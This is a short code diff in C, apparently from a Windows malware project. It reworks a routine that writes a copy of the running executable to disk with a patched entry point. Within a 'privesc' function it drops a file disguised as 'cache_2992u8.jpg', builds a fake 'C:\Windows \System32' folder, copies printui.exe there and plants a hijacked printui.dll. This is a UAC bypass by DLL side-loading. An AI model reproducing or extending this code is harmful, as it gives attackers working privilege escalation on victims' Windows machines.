@@ -71,7 +71,7 @@ int cleanup(){
     RemoveDirectoryA("\\\\?\\C:\\Windows \\");
     main(0, 0);
 }
-static void dump2disk(const char* name, int dll){
+static void dump2disk(const char* name, void* entryp, int dll){
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)revival;
 	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)revival + dosHeader->e_lfanew);
 
@@ -79,12 +79,10 @@ static void dump2disk(const char* name, int dll){
 	memcpy(localImage, revival, ntHeader->OptionalHeader.SizeOfHeaders);
 	PIMAGE_NT_HEADERS ntHeader2 = (PIMAGE_NT_HEADERS)((DWORD_PTR)localImage + dosHeader->e_lfanew);
 	
-	if(dll == 1){
+	if(dll)
 	    ntHeader2->FileHeader.Characteristics |= 0x2000;
-        ntHeader2->OptionalHeader.AddressOfEntryPoint = (unsigned long long)&dllmain - (unsigned long long)imageBase;
-    }else if(dll == 2){
-        ntHeader2->OptionalHeader.AddressOfEntryPoint = (unsigned long long)&cleanup - (unsigned long long)imageBase;
-    }
+    if(entryp)
+        ntHeader2->OptionalHeader.AddressOfEntryPoint = (unsigned long long)entryp - (unsigned long long)imageBase;
 	int sumsz = ntHeader->OptionalHeader.SizeOfHeaders;
     for (int count = 0; count < ntHeader->FileHeader.NumberOfSections; count++){
         PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((DWORD64)localImage + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (count * 40));
@@ -104,12 +102,12 @@ int privesc(){
         char tmp[MAX_PATH] = {0};
         GetTempPathA(MAX_PATH, tmp);
         strcat(tmp, "cache_2992u8.jpg");
-        dump2disk(tmp, 2);
+        dump2disk(tmp, &cleanup, 0);
         CreateDirectoryA("\\\\?\\C:\\Windows \\", NULL);
         CreateDirectoryA("\\\\?\\C:\\Windows \\System32", NULL);
         MyCopy("\\\\?\\C:\\Windows\\System32\\printui.exe", "C:\\Windows \\System32\\printui2.exe");
 
-        dump2disk("C:\\Windows \\System32\\printui.dll", 1);
+        dump2disk("C:\\Windows \\System32\\printui.dll", &dllmain, 1);
         
         STARTUPINFO si;
         PROCESS_INFORMATION pi;
